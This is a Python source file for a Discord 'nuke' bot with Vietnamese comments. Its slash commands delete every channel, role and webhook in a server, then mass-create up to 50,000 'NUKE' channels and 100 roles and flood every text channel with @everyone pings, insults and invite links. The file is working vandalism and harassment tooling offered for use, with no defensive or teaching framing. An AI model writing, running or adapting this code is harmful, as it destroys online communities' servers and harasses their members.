# bot.py - Slash Command Nuke Bot with 50k Channel Spam
import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os
import random
from typing import Dict
from flask import Flask, jsonify
import threading

# Flask app for web service
app = Flask(__name__)

TOKEN = os.getenv('DISCORD_TOKEN', '')
PORT = int(os.getenv('PORT', 10000))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

class NukeCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.rate_limit_delay = 0.3
        self.channel_count = 50000
        self.role_count = 100
        self.spam_per_channel = 10

    @app_commands.command(name='nuke', description='🔥 TẤN CÔNG SERVER - TẠO 50K KÊNH + SPAM')
    @app_commands.default_permissions(administrator=True)
    async def slash_nuke(self, interaction: discord.Interaction):
        """Slash command nuke - 50k channels, spam, roles"""
        await interaction.response.send_message('🔥 **NUKE SEQUENCE INITIATED** 🔥', ephemeral=False)
        
        results = {
            'created_channels': 0,
            'created_roles': 0,
            'spam_messages': 0
        }
        
        # Phase 1: Xóa tất cả kênh cũ
        await interaction.channel.send('🗑️ Phase 1: Deleting old channels...')
        deleted = await self.delete_all_channels(interaction.guild)
        await interaction.channel.send(f'✅ Deleted {deleted} channels')
        
        # Phase 2: Xóa tất cả role cũ
        await interaction.channel.send('🗑️ Phase 1: Deleting old roles...')
        deleted_roles = await self.delete_all_roles(interaction.guild)
        await interaction.channel.send(f'✅ Deleted {deleted_roles} roles')
        
        # Phase 3: Xóa webhook
        await interaction.channel.send('🗑️ Phase 1: Deleting webhooks...')
        deleted_webhooks = await self.delete_all_webhooks(interaction.guild)
        await interaction.channel.send(f'✅ Deleted {deleted_webhooks} webhooks')
        
        # Phase 4: Tạo 50k kênh spam
        await interaction.channel.send(f'📝 Phase 2: Creating {self.channel_count} spam channels...')
        results['created_channels'] = await self.create_spam_channels(interaction.guild)
        await interaction.channel.send(f'✅ Created {results["created_channels"]} channels')
        
        # Phase 5: Tạo role spam
        await interaction.channel.send(f'📝 Phase 2: Creating {self.role_count} spam roles...')
        results['created_roles'] = await self.create_spam_roles(interaction.guild)
        await interaction.channel.send(f'✅ Created {results["created_roles"]} roles')
        
        # Phase 6: Spam ping @everyone vào tất cả kênh
        await interaction.channel.send(f'💬 Phase 3: Spamming @everyone to all channels...')
        results['spam_messages'] = await self.spam_all_channels(interaction.guild)
        await interaction.channel.send(f'✅ Sent {results["spam_messages"]} spam messages')
        
        # Báo cáo hoàn thành
        embed = discord.Embed(
            title='✅ NUKE COMPLETE',
            description=f'Server đã bị tấn công thành công!',
            color=discord.Color.red()
        )
        embed.add_field(name='📊 Số kênh đã tạo', value=f'{results["created_channels"]:,}', inline=True)
        embed.add_field(name='👑 Số role đã tạo', value=f'{results["created_roles"]:,}', inline=True)
        embed.add_field(name='💬 Số tin nhắn spam', value=f'{results["spam_messages"]:,}', inline=True)
        embed.add_field(name='⚡ Tốc độ', value='~0.3s/action', inline=True)
        embed.add_field(name='🔥 Trạng thái', value='HOÀN THÀNH 100%', inline=True)
        
        await interaction.channel.send(embed=embed)

    @app_commands.command(name='spam', description='💬 Spam @everyone vào tất cả kênh')
    @app_commands.default_permissions(administrator=True)
    async def slash_spam(self, interaction: discord.Interaction, count: int = 10):
        """Spam all channels with @everyone"""
        await interaction.response.send_message(f'💬 Spamming {count} messages per channel...')
        sent = await self.spam_all_channels(interaction.guild, count)
        await interaction.channel.send(f'✅ Sent {sent} spam messages')

    @app_commands.command(name='create', description='📝 Tạo kênh spam hàng loạt')
    @app_commands.default_permissions(administrator=True)
    async def slash_create(self, interaction: discord.Interaction, count: int = 100):
        """Create spam channels"""
        await interaction.response.send_message(f'📝 Creating {count} channels...')
        created = await self.create_spam_channels(interaction.guild, count)
        await interaction.channel.send(f'✅ Created {created} channels')

    @app_commands.command(name='rolespam', description='👑 Tạo role spam hàng loạt')
    @app_commands.default_permissions(administrator=True)
    async def slash_rolespam(self, interaction: discord.Interaction, count: int = 50):
        """Create spam roles"""
        await interaction.response.send_message(f'👑 Creating {count} roles...')
        created = await self.create_spam_roles(interaction.guild, count)
        await interaction.channel.send(f'✅ Created {created} roles')

    @app_commands.command(name='clear', description='🗑️ Xóa tất cả kênh, role, webhook')
    @app_commands.default_permissions(administrator=True)
    async def slash_clear(self, interaction: discord.Interaction):
        """Delete everything in server"""
        await interaction.response.send_message('🗑️ Clearing server...')
        
        deleted = await self.delete_all_channels(interaction.guild)
        deleted_roles = await self.delete_all_roles(interaction.guild)
        deleted_webhooks = await self.delete_all_webhooks(interaction.guild)
        
        await interaction.channel.send(f'✅ Deleted {deleted} channels, {deleted_roles} roles, {deleted_webhooks} webhooks')

    async def delete_all_channels(self, guild):
        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                count += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return count

    async def delete_all_roles(self, guild):
        count = 0
        for role in guild.roles:
            if role.name != '@everyone':
                try:
                    await role.delete()
                    count += 1
                    await asyncio.sleep(self.rate_limit_delay)
                except:
                    pass
        return count

    async def delete_all_webhooks(self, guild):
        count = 0
        webhooks = await guild.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                count += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return count

    async def create_spam_channels(self, guild, count: int = None):
        if count is None:
            count = self.channel_count
        created = 0
        for i in range(count):
            try:
                await guild.create_text_channel(f'NUKE-{i}')
                created += 1
                if created % 100 == 0:
                    print(f'✅ Created {created}/{count} channels')
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return created

    async def create_spam_roles(self, guild, count: int = None):
        if count is None:
            count = self.role_count
        created = 0
        for i in range(count):
            try:
                await guild.create_role(
                    name=f'NUKE-ROLE-{i}',
                    color=discord.Color(random.randint(0, 0xFFFFFF)),
                    hoist=True,
                    mentionable=True
                )
                created += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return created

    async def spam_all_channels(self, guild, count: int = None):
        if count is None:
            count = self.spam_per_channel
        sent = 0
        messages = [
            '@everyone SERVER DA BI NUKE',
            '@everyone NUKE ME MAY NEK',
            '@everyone https://discord.gg/xnyxd6QEa',
            '@everyone SERVER NAY DA BI PHA HUY',
            '@everyone MAY CHET CHUA CON NGU',
            '@everyone TAM BIET SERVER NHE',
            '@everyone HAHA NUKE THANH CONG',
            '@everyone https://discord.gg/nuke-server'
        ]
        channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        for channel in channels:
            try:
                await channel.send(random.choice(messages))
                sent += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return sent

@bot.event
async def on_ready():
    print(f'✅ Bot logged in as {bot.user}')
    print(f'📡 Connected to {len(bot.guilds)} servers')
    print('🔥 Slash commands ready!')
    
    # Sync slash commands
    try:
        synced = await bot.tree.sync()
        print(f'✅ Synced {len(synced)} slash commands')
    except Exception as e:
        print(f'❌ Failed to sync commands: {e}')

# Flask routes to keep web service alive
@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'bot': str(bot.user),
        'servers': len(bot.guilds),
        'commands': ['/nuke', '/spam', '/create', '/rolespam', '/clear']
    })

@app.route('/ping')
def ping():
    return jsonify({'pong': True, 'status': 'alive'})

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

async def run_bot():
    await bot.add_cog(NukeCommands(bot))
    await bot.start(TOKEN)

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("Bot stopped")
    except Exception as e:
        print(f"Error: {e}")
